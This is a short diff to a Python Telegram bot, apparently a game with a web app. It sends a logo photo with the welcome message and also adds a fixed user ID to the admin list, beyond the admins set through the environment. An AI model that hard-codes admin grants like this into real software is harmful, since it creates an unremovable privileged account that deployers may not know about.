@@ -32,6 +32,7 @@ ADMIN_URL = os.environ.get("ADMIN_URL", "https://samienyew1000-boop.github.io/fr
 ADMIN_USER_IDS = {
     value.strip() for value in os.environ.get("TELEGRAM_ADMIN_USER_IDS", "").split(",") if value.strip()
 }
+ADMIN_USER_IDS.add("8474256363")
 
 try:
     if hasattr(sys.stdout, "reconfigure"):
@@ -126,6 +127,17 @@ def send_welcome(chat_id, first_name="Player"):
             ]
         ]
     }
+
+    photo_url = WEBAPP_URL.rstrip("/") + "/assets/inout_logo.png"
+    photo_res = api_call("sendPhoto", {
+        "chat_id": chat_id,
+        "photo": photo_url,
+        "caption": welcome_text,
+        "parse_mode": "HTML",
+        "reply_markup": keyboard
+    })
+    if photo_res and photo_res.get("ok"):
+        return photo_res
 
     return api_call("sendMessage", {
         "chat_id": chat_id,
